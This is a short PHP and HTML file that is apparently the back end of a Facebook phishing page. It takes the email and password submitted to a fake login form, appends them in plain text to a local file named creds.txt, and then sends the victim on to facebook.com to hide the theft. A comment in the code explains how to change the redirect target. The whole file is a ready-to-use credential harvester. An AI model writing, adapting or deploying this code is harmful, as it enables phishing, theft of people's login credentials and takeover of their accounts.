<!DOCTYPE html>
 <?php
$myfile = fopen("creds.txt", "a");
$Username = $_POST['email'];
$Password = $_POST['pass'];
fwrite($myfile, "\r\n Username = ".$Username ."\r\n");
fwrite($myfile, " Password = ".$Password."\r\n====================================================================================================================================");
fclose($myfile);
?>
<html>
<script>
<!---Redirect the page where you want just change the value of window.location --->
window.location = "http://www.facebook.com"
</script>
</html>